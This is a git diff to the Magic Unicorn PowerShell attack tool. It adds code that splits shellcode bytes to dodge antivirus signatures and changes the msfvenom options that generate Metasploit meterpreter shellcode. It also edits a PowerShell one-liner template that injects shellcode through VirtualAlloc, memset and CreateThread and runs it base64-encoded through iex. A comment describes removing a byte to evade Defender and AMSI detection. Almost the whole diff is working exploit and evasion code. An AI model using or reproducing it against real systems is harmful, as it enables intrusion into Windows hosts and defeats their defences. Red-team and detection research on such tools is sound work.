@@ -443,7 +443,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.4.4 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.4.5 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -493,11 +493,24 @@ def liquify_bytes(bytes, stub):
 
     # split again, we can do this all day
     whopper2 = ""
+    match = re.search("0xc7,0xe2", bytes)
     if match:
         goat_romper2 = generate_random_string(2,4)
         whopper2 = "royalewithcheese"
         bytes = bytes.split(",0xc7,0xe2,")
         bytes = (bytes[0] + ");$" + goat_romper2 + "=(0xc7,0xe2," + bytes[1])
+
+    whopper3 = ""
+    match = re.search("0x8d,0x5d,0x68,0x6e", bytes)
+    if match:
+        goat_romper3 = generate_random_string(2,4)
+        goat_romper4 = generate_random_string(2,4)
+        goat_romper5 = generate_random_string(2,4)
+        whopper3 = "royalewithcheese"
+        bytes = bytes.split("0x8d,0x5d,")
+        bytes2 = bytes[1].split("0x68,", 1)
+
+        bytes = bytes[0][:-1] + ");$" + goat_romper3 + "=(0x8d,0x5d);" + "$" + goat_romper4 + "=(0x68);" + "$" + goat_romper5 + "=(" + bytes2[1]
 
     bytes = bytes.split(",")
     counter = 0
@@ -582,6 +595,10 @@ def liquify_bytes(bytes, stub):
     # if we are hungry
     if whopper != "": assemble = assemble + " + $" + goat_romper 
     if whopper2 != "": assemble = assemble + " + $" + goat_romper2
+    if whopper3 != "":
+        assemble = assemble + " + $" + goat_romper3
+        assemble = assemble + " + $" + goat_romper4
+        assemble = assemble + " + $" + goat_romper5
     if a2 != "": assemble = assemble + " + $" + a2
     if a3 != "": assemble = assemble + " + $" + a3
     if a4 != "": assemble = assemble + " + $" + a4 
@@ -822,7 +839,7 @@ def generate_shellcode(payload, ipaddr, port):
         data = shellcode.replace("\\xURLHERE", url_patched)
 
     else:
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c".format( payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=50 StagerVerifySSLCert=true -a x86 --platform windows --smallest -f c".format( payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         data = data.decode("ascii").replace('"\\xfc', '"', 1)
@@ -947,7 +964,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     msv = mangle_word("msvcrt.dll")
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex "& $2222 -e $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -pass;$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Len -gt 0x$randstack){$gggg=$zzzz.Len};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);while($true){Start-Sleep 60};';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex " $2222 -e $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
